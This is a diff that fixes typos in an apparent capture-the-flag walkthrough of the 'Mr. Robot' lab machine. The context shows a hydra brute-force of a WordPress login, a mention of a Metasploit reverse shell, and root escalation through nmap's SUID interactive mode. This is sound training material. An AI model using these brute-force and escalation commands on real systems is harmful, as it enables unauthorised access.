@@ -2825,7 +2825,7 @@
   
     <li class="md-nav__item">
       <a href="../../links/" class="md-nav__link">
-        Hack Challenges
+        Hack CTF Overview
       </a>
     </li>
   
@@ -4525,7 +4525,7 @@ nikto -h <span class="nv">$IP</span>
 <p>Let's download the dictionary file "fsocity.dic" and have a look:</p>
 <div class="highlight"><pre><span></span><code>wget <span class="nv">$IP</span>/fsocity.dic
 </code></pre></div>
-<p>The file seems to be a password list but there are a lot of redunant entries. If we want to use this to brute-force login to the word-press admin portal we should remove all duplicate entries. We can use <code>uniq</code> for this but uniq expects a sorted list so we run the following:</p>
+<p>The file seems to be a password list but there are a lot of redundant entries. If we want to use this to brute-force login to the word-press admin portal we should remove all duplicate entries. We can use <code>uniq</code> for this but uniq expects a sorted list so we run the following:</p>
 <div class="highlight"><pre><span></span><code>sort fsocity.dic <span class="p">|</span> uniq &gt; uniqfsocity.dic
 </code></pre></div>
 <p>We can use hydra to brute-force http-post-form on the wordpress login page to find out the username. In case we get a "Invalid" the attempt failed.</p>
@@ -4534,7 +4534,7 @@ nikto -h <span class="nv">$IP</span>
 <p>We find out the username "Elliot" is valid and abort hydra. Now let's use the same dictionary again to brute-force the password of Elliot. If a correct user logs in with an invalid password we can use "incorrect" as false trigger.</p>
 <div class="highlight"><pre><span></span><code>hydra -l Elliot -P uniqfsocity.dic -t <span class="m">64</span> <span class="nv">$IP</span> http-post-form <span class="s2">&quot;/wp-login/:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=incorrect.&quot;</span>
 </code></pre></div>
-<p>This unfortunantly takes some time but after a while we get the correct password for Elliot: ER28-0652</p>
+<p>This unfortunately takes some time but after a while we get the correct password for Elliot: ER28-0652</p>
 <p>With access to the wordpress backend we can start Metasploit to exploit wordpress for a reverse shell:</p>
 <div class="highlight"><pre><span></span><code>msfdb init
 msfconsole
@@ -4648,7 +4648,7 @@ cat /home/robot/key-2-of-3.txt
 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 /usr/lib/pt_chown
 </code></pre></div>
-<p>We can exploit nmap (/usr/local/bin/nmap) with a vulnerability in the interactive mode since nmap is running with root priviledges but we can trigger it as user robot:</p>
+<p>We can exploit nmap (/usr/local/bin/nmap) with a vulnerability in the interactive mode since nmap is running with root privileges but we can trigger it as user robot:</p>
 <div class="highlight"><pre><span></span><code>nmap --interactive
 
 Starting nmap V. <span class="m">3</span>.81 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
